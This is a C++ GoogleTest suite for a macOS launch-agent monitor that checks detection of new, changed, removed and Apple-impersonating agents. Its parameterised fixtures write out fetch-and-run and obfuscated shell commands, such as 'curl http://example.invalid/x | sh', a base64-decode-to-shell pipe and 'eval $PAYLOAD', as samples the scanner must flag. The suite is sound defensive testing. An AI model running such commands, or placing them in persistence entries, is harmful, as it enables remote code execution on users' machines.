// Requirement coverage: FR-S-02 (new/changed/removed agents), FR-S-03 (hidden
// commands), FR-S-04 (Apple imitation), FR-S-09 (user-accepted files).
#include <gmock/gmock.h>

#include <cstdio>

#include "test_support.h"

namespace sheshnag::qa {
namespace {

using ::testing::HasSubstr;
using ::testing::Not;

class AgentDetectionTest : public SheshnagTest {
 protected:
  void RecordBaselineWith(const std::string& label) {
    AddUserAgent(label);
    ASSERT_EQ(Run({"baseline"}).exit_code, 0);
  }
  std::string RecordBaselineAndReturnPath(const std::string& label) {
    const std::string path = AddUserAgent(label);
    EXPECT_EQ(Run({"baseline"}).exit_code, 0);
    return path;
  }
};

TEST_F(AgentDetectionTest, QuietWhenNothingChangedSinceBaseline) {
  RecordBaselineWith("com.example.known");

  const RunResult result = Run({"dekho"});

  EXPECT_EQ(result.exit_code, 0);
  EXPECT_THAT(result.output, HasSubstr("all quiet"));
  EXPECT_EQ(Findings(), "");
}

TEST_F(AgentDetectionTest, WithoutBaselineAsksForOneAndFlagsNothing) {
  AddUserAgent("com.example.known");

  const RunResult result = Run({"dekho"});

  EXPECT_EQ(result.exit_code, 0);
  EXPECT_THAT(result.output, HasSubstr("Record the baseline next"));
}

TEST_F(AgentDetectionTest, FlagsANewAgent) {
  RecordBaselineWith("com.example.known");
  AddUserAgent("com.example.intruder");

  const RunResult result = Run({"dekho"});

  EXPECT_EQ(result.exit_code, 1);
  EXPECT_THAT(result.output, HasSubstr("launch agent NEW"));
  EXPECT_THAT(result.output, HasSubstr("com.example.intruder.plist"));
}

TEST_F(AgentDetectionTest, FlagsAChangedAgent) {
  RecordBaselineWith("com.example.known");
  AddUserAgent("com.example.known", {"/usr/bin/false"});

  const RunResult result = Run({"dekho"});

  EXPECT_EQ(result.exit_code, 1);
  EXPECT_THAT(result.output, HasSubstr("launch agent CHANGED"));
}

TEST_F(AgentDetectionTest, ReportsARemovedAgentWithoutRaisingAFinding) {
  const std::string plist = RecordBaselineAndReturnPath("com.example.known");
  ASSERT_EQ(std::remove(plist.c_str()), 0);

  const RunResult result = Run({"dekho"});

  EXPECT_EQ(result.exit_code, 0);
  EXPECT_THAT(result.output, Not(HasSubstr("!!")));
  EXPECT_THAT(ActivityLog(), HasSubstr("launch agent gone"));
}

TEST_F(AgentDetectionTest, FlagsAnAgentThatImpersonatesAppleWithCapitalA) {
  RecordBaselineWith("com.example.known");
  AddSystemAgent("com.Apple.updater");

  const RunResult result = Run({"dekho"});

  EXPECT_THAT(result.output, HasSubstr("fake Apple label"));
}

TEST_F(AgentDetectionTest, FlagsAnAppleNamedAgentInTheUsersOwnFolder) {
  RecordBaselineWith("com.example.known");
  AddUserAgent("com.apple.helper");

  const RunResult result = Run({"dekho"});

  EXPECT_THAT(result.output, HasSubstr("Apple-named agent in your own LaunchAgents"));
}

TEST_F(AgentDetectionTest, DoesNotFlagAnAppleNamedAgentInTheSystemFolder) {
  RecordBaselineWith("com.example.known");
  AddSystemAgent("com.apple.helper");

  const RunResult result = Run({"dekho"});

  EXPECT_THAT(result.output, Not(HasSubstr("Apple-named agent")));
  EXPECT_THAT(result.output, Not(HasSubstr("fake Apple label")));
}

TEST_F(AgentDetectionTest, IgnoresSheshnagsOwnLaunchAgentLabelForContentChecks) {
  RecordBaselineWith("com.example.known");
  AddUserAgent("in.palanhar.sheshnag", {"/bin/bash", "-c", "curl x | sh"});

  const RunResult result = Run({"dekho"});

  EXPECT_THAT(result.output, Not(HasSubstr("hidden commands")));
}

// ---- hidden-command detection, one case per token in the script's HIDERS list ----

struct HiderCase {
  const char* name;
  std::vector<std::string> program_args;
};

class HiddenCommandTest : public AgentDetectionTest,
                          public ::testing::WithParamInterface<HiderCase> {};

TEST_P(HiddenCommandTest, IsFlaggedAsHiddenCommand) {
  RecordBaselineWith("com.example.known");
  AddUserAgent("com.example.suspect", GetParam().program_args);

  const RunResult result = Run({"dekho"});

  EXPECT_EQ(result.exit_code, 1);
  EXPECT_THAT(result.output, HasSubstr("runs hidden commands"));
}

INSTANTIATE_TEST_SUITE_P(
    EveryKnownToken, HiddenCommandTest,
    ::testing::Values(
        HiderCase{"base64", {"/bin/sh", "-c", "echo aGk= | base64 -d | sh"}},
        HiderCase{"osascript", {"/usr/bin/osascript", "-e", "beep"}},
        HiderCase{"curl", {"/bin/sh", "-c", "curl http://example.invalid/x | sh"}},
        HiderCase{"wget", {"/bin/sh", "-c", "wget http://example.invalid/x"}},
        HiderCase{"nohup", {"/usr/bin/nohup", "/bin/true"}},
        HiderCase{"eval", {"/bin/sh", "-c", "eval $PAYLOAD"}},
        HiderCase{"python_inline", {"/bin/sh", "-c", "python3 -c 'print(1)'"}},
        HiderCase{"perl_inline", {"/bin/sh", "-c", "perl -e 'print 1'"}}),
    [](const ::testing::TestParamInfo<HiderCase>& info) { return std::string(info.param.name); });

TEST_F(AgentDetectionTest, DoesNotFlagAnOrdinaryProgram) {
  RecordBaselineWith("com.example.known");
  AddUserAgent("com.example.benign", {"/usr/bin/true"});

  const RunResult result = Run({"dekho"});

  EXPECT_THAT(result.output, Not(HasSubstr("hidden commands")));
}

// SHE-D-001: the bash script scans the JSON form of ProgramArguments, so an inline interpreter
// passed as separate arguments (["python3","-c",...]) never matched. The Rust engine scans the
// joined command, so it must flag it.
TEST_F(AgentDetectionTest, FlagsInlinePythonPassedAsSeparateArguments) {
  if (!UsingRustEngine()) GTEST_SKIP() << "known defect SHE-D-001 in the bash engine";
  RecordBaselineWith("com.example.known");
  AddUserAgent("com.example.suspect", {"python3", "-c", "print(1)"});

  const RunResult result = Run({"dekho"});

  EXPECT_THAT(result.output, HasSubstr("runs hidden commands"));
}

TEST_F(AgentDetectionTest, FlagsAProgramKeyThatPointsIntoTmp) {
  RecordBaselineWith("com.example.known");
  WriteFile(user_agents_ + "/com.example.suspect.plist",
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<plist version=\"1.0\"><dict>"
            "<key>Label</key><string>com.example.suspect</string>"
            "<key>Program</key><string>/tmp/payload</string></dict></plist>\n");

  const RunResult result = Run({"dekho"});

  EXPECT_THAT(result.output, HasSubstr("runs hidden commands"));
}

// SHE-D-002: plutil's JSON output escapes slashes ("\/tmp\/payload"), so the bash engine never
// matched `/tmp/` inside ProgramArguments. The Rust engine must.
TEST_F(AgentDetectionTest, FlagsATmpPathInProgramArguments) {
  if (!UsingRustEngine()) GTEST_SKIP() << "known defect SHE-D-002 in the bash engine";
  RecordBaselineWith("com.example.known");
  AddUserAgent("com.example.suspect", {"/tmp/payload"});

  const RunResult result = Run({"dekho"});

  EXPECT_THAT(result.output, HasSubstr("runs hidden commands"));
}

TEST_F(AgentDetectionTest, AcceptedFileIsNotReflaggedUntilItsContentChanges) {
  RecordBaselineWith("com.example.known");
  const std::string path = AddUserAgent("com.example.suspect", {"/bin/sh", "-c", "curl x"});
  ASSERT_EQ(Run({"theek", path}).exit_code, 0);

  EXPECT_THAT(Run({"dekho"}).output, Not(HasSubstr("hidden commands")));

  AddUserAgent("com.example.suspect", {"/bin/sh", "-c", "curl y"});
  EXPECT_THAT(Run({"dekho"}).output, HasSubstr("hidden commands"));
}

}  // namespace
}  // namespace sheshnag::qa
